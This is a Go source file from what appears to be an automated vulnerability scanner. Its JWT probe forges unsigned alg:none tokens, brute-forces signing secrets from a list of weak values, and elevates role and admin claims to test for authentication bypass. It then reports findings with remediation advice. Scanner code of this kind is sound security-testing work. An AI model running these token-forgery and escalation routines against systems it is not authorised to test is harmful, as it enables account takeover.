package scanner

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"

	"auto-bughunter/backend/internal/model"
)

// jwtBodyLimit caps per-probe response reads for the JWT probe.
const jwtBodyLimit = 128 * 1024

// jwtWeakSecrets is the list of commonly-used JWT signing secrets.
var jwtWeakSecrets = []string{
	"secret", "Secret", "SECRET",
	"password", "Password", "PASSWORD",
	"jwt_secret", "jwt-secret", "jwtsecret",
	"changeit", "changeme", "change_me",
	"1234567890", "123456", "12345678",
	"admin", "administrator",
	"test", "testing",
	"default", "pass", "token",
	"supersecret", "super_secret",
	"your-256-bit-secret",
	"your-secret-key",
	"your_secret_key",
	"abcdefghijklmnop",
	"qwerty", "letmein",
	"juiceshop", "juice-shop",
	"app_secret", "appsecret",
	"application_secret",
	"refresh_secret",
	"access_secret",
	"signing_key",
	"hmac_secret",
	"mysecret",
	"node-secret",
	"nodejwt",
	"express-secret",
	"flask-secret",
	"django-insecure",
	"rails-secret",
	"development",
	"production",
	"staging",
	"",
}

// runJWTProbe extracts any JWT-shaped value from the session's TokenStore and
// auth profile headers, then tests three vulnerabilities:
//
//  1. Algorithm confusion (alg:none) — the token is reconstructed with the
//     header {"alg":"none","typ":"JWT"}, the signature stripped, and a
//     privileged request is sent. Acceptance indicates the server does not
//     verify the signature algorithm.
//
//  2. Weak secret — the token is re-signed with each of jwtWeakSecrets using
//     HMAC-SHA256. Acceptance of a re-signed token with a guessed secret
//     indicates the signing key is predictable.
//
//  3. Privilege escalation — if the payload contains role/isAdmin/userId
//     fields, their values are elevated and the token is re-signed with the
//     discovered weak secret (or left unsigned for alg:none) to test whether
//     the server enforces the claim.
func (s *Service) runJWTProbe(ctx context.Context, input RunInput) []model.Finding {
	if input.Options.PassiveOnly || input.Session == nil {
		return nil
	}

	// Extract JWT from session token store, then fall back to auth headers.
	raw := extractJWTFromSession(input.Session, input.AuthProfile)
	if raw == "" {
		return nil
	}

	_, payload, _, err := parseJWT(raw)
	if err != nil {
		return nil
	}

	if input.Emit != nil {
		input.Emit(model.ScanEvent{
			Type:    model.ScanEventCommand,
			Command: fmt.Sprintf("jwt-probe %s", input.Target),
			Message: "Testing JWT for alg:none confusion and weak signing secrets",
		})
	}

	var findings []model.Finding

	// Test 1: alg:none confusion.
	if f := s.testJWTAlgNone(ctx, input, raw, payload); f != nil {
		findings = append(findings, *f)
	}

	// Test 2 and 3: Weak secret brute-force and privilege escalation.
	if f := s.testJWTWeakSecret(ctx, input, raw, payload); f != nil {
		findings = append(findings, *f)
	}

	return findings
}

// extractJWTFromSession looks for a JWT-shaped value (three base64url segments
// separated by dots) in the session token store and auth profile headers.
func extractJWTFromSession(sess *ScanSession, auth model.ScanAuthProfile) string {
	if sess == nil {
		return ""
	}
	for _, key := range []string{"bearer", "access_token", "jwt", "id_token", "token"} {
		if v := sess.TokenStore.Get(key); isJWT(v) {
			return v
		}
	}
	// Check auth profile Authorization header.
	for _, k := range []string{"Authorization", "authorization"} {
		if v := auth.Headers[k]; v != "" {
			v = strings.TrimPrefix(v, "Bearer ")
			v = strings.TrimPrefix(v, "bearer ")
			if isJWT(v) {
				return v
			}
		}
	}
	return ""
}

// isJWT returns true when s has the three-segment base64url structure of a JWT.
func isJWT(s string) bool {
	parts := strings.Split(strings.TrimSpace(s), ".")
	if len(parts) != 3 {
		return false
	}
	for _, p := range parts[:2] {
		if len(p) < 4 {
			return false
		}
	}
	return true
}

// parseJWT splits a JWT into its decoded header map, decoded payload map,
// and raw signature segment.
func parseJWT(raw string) (map[string]interface{}, map[string]interface{}, string, error) {
	parts := strings.Split(raw, ".")
	if len(parts) != 3 {
		return nil, nil, "", fmt.Errorf("not a JWT")
	}

	hBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return nil, nil, "", fmt.Errorf("header decode: %w", err)
	}
	var hdr map[string]interface{}
	if err := json.Unmarshal(hBytes, &hdr); err != nil {
		return nil, nil, "", fmt.Errorf("header json: %w", err)
	}

	pBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, nil, "", fmt.Errorf("payload decode: %w", err)
	}
	var payload map[string]interface{}
	if err := json.Unmarshal(pBytes, &payload); err != nil {
		return nil, nil, "", fmt.Errorf("payload json: %w", err)
	}

	return hdr, payload, parts[2], nil
}

// buildJWT assembles a JWT from header and payload maps with an optional
// HMAC-SHA256 signature. When secret is empty, the signature segment is
// omitted (alg:none style).
func buildJWT(hdr, payload map[string]interface{}, secret string) (string, error) {
	hdrJSON, err := json.Marshal(hdr)
	if err != nil {
		return "", err
	}
	payJSON, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}
	h := base64.RawURLEncoding.EncodeToString(hdrJSON)
	p := base64.RawURLEncoding.EncodeToString(payJSON)
	msg := h + "." + p
	if secret == "" {
		return msg + ".", nil
	}
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(msg))
	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	return msg + "." + sig, nil
}

// sendWithJWT issues a GET to the target with the given token in the
// Authorization header and returns the response status code and body.
func (s *Service) sendWithJWT(ctx context.Context, input RunInput, token string) (int, []byte, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, input.Target, nil)
	if err != nil {
		return 0, nil, err
	}
	ApplyAuthProfile(req, input.AuthProfile)
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := s.doRequestWithSession(ctx, req, input.Options, input.Session)
	if err != nil || resp == nil {
		return 0, nil, err
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, jwtBodyLimit))
	_ = resp.Body.Close()
	return resp.StatusCode, body, nil
}

// testJWTAlgNone creates a token with header {"alg":"none"} and an empty
// signature and tests whether the server accepts it.
func (s *Service) testJWTAlgNone(ctx context.Context, input RunInput, original string, payload map[string]interface{}) *model.Finding {
	noneHdr := map[string]interface{}{"alg": "none", "typ": "JWT"}
	forged, err := buildJWT(noneHdr, payload, "")
	if err != nil {
		return nil
	}
	// Skip test if the forged token is identical to the original (unlikely
	// but guards against edge cases).
	if forged == original {
		return nil
	}

	status, _, err := s.sendWithJWT(ctx, input, forged)
	if err != nil {
		return nil
	}
	if status < 200 || status >= 300 {
		return nil
	}
	return &model.Finding{
		ID:       "jwt-alg-none",
		Category: "authentication",
		Severity: model.SeverityCritical,
		Title:    "JWT algorithm confusion: server accepts unsigned tokens (alg:none)",
		Description: "The server accepted a JWT with the algorithm set to 'none' and an empty signature. " +
			"An attacker can forge arbitrary JWT claims (including elevated roles and user IDs) " +
			"without knowing the signing secret, bypassing authentication entirely.",
		Evidence: fmt.Sprintf(
			"Forged token with alg=none accepted by %s → HTTP %d",
			input.Target, status,
		),
		Recommendation: "Require the application to explicitly allowlist the expected signing algorithm " +
			"(e.g. HS256 or RS256) and reject any token whose 'alg' header differs from the expectation. " +
			"Never accept 'none' as a valid algorithm in production.",
		Confidence:    0.95,
		AffectedURL:   input.Target,
		CWE:           "CWE-327",
		OWASPCategory: "A07:2021 - Identification and Authentication Failures",
		Sources:       []string{"active-scanner", "jwt-probe"},
		BusinessTags:  []string{"jwt", "authentication", "alg-none"},
		EvidenceFields: map[string]string{
			"validationType": "active-probe",
			"forgedToken":    truncateString(forged, 120),
			"responseStatus": fmt.Sprintf("%d", status),
		},
	}
}

// testJWTWeakSecret tries to re-sign the payload with each entry in
// jwtWeakSecrets. When a guessed secret produces a token the server accepts,
// the probe optionally escalates privileges (role/isAdmin/userId) and reports.
func (s *Service) testJWTWeakSecret(ctx context.Context, input RunInput, original string, payload map[string]interface{}) *model.Finding {
	hs256Hdr := map[string]interface{}{"alg": "HS256", "typ": "JWT"}

	for _, secret := range jwtWeakSecrets {
		resigned, err := buildJWT(hs256Hdr, payload, secret)
		if err != nil {
			continue
		}
		if resigned == original {
			continue
		}

		status, _, err := s.sendWithJWT(ctx, input, resigned)
		if err != nil {
			continue
		}
		if status < 200 || status >= 300 {
			continue
		}

		// Confirmed weak secret — try privilege escalation.
		escalatedPayload := clonePayload(payload)
		escalated := false
		for _, roleKey := range []string{"role", "roles", "isAdmin", "admin", "scope", "permissions"} {
			if _, ok := escalatedPayload[roleKey]; ok {
				switch roleKey {
				case "role", "roles":
					escalatedPayload[roleKey] = "admin"
				case "isAdmin", "admin":
					escalatedPayload[roleKey] = true
				case "scope", "permissions":
					escalatedPayload[roleKey] = "admin:full"
				}
				escalated = true
			}
		}

		description := fmt.Sprintf(
			"The JWT signing secret %q was found by brute-force. An attacker can sign arbitrary "+
				"JWT claims using this secret, gaining full access to any user account.",
			secret,
		)
		severity := model.SeverityCritical
		title := "JWT weak signing secret discovered by brute-force"
		evidence := fmt.Sprintf("Re-signed token with secret %q accepted by %s → HTTP %d", secret, input.Target, status)

		if escalated {
			escalatedToken, err := buildJWT(hs256Hdr, escalatedPayload, secret)
			if err == nil {
				escStatus, _, escErr := s.sendWithJWT(ctx, input, escalatedToken)
				if escErr == nil && escStatus >= 200 && escStatus < 300 {
					description += " Privilege escalation to admin role was also confirmed."
					evidence += fmt.Sprintf("; escalated token → HTTP %d", escStatus)
				}
			}
		}

		return &model.Finding{
			ID:          "jwt-weak-secret",
			Category:    "authentication",
			Severity:    severity,
			Title:       title,
			Description: description,
			Evidence:    evidence,
			Recommendation: "Replace the JWT signing secret with a cryptographically random value of at least " +
				"256 bits. Store it in a secrets manager, never in source code or config files. " +
				"Rotate compromised secrets immediately and invalidate all active sessions.",
			Confidence:    0.93,
			AffectedURL:   input.Target,
			CWE:           "CWE-798",
			OWASPCategory: "A07:2021 - Identification and Authentication Failures",
			Sources:       []string{"active-scanner", "jwt-probe"},
			BusinessTags:  []string{"jwt", "authentication", "weak-secret"},
			EvidenceFields: map[string]string{
				"validationType": "active-probe",
				"discoveredSecret": func() string {
					// Mask all but the first 2 chars of the secret in evidence.
					if len(secret) <= 2 {
						return strings.Repeat("*", len(secret))
					}
					return secret[:2] + strings.Repeat("*", len(secret)-2)
				}(),
				"responseStatus": fmt.Sprintf("%d", status),
			},
		}
	}
	return nil
}

// clonePayload makes a shallow copy of a JWT payload map.
func clonePayload(src map[string]interface{}) map[string]interface{} {
	out := make(map[string]interface{}, len(src))
	for k, v := range src {
		out[k] = v
	}
	return out
}

// truncateString returns at most n characters of s, appending "…" when trimmed.
func truncateString(s string, n int) string {
	runes := []rune(s)
	if len(runes) <= n {
		return s
	}
	return string(runes[:n]) + "…"
}
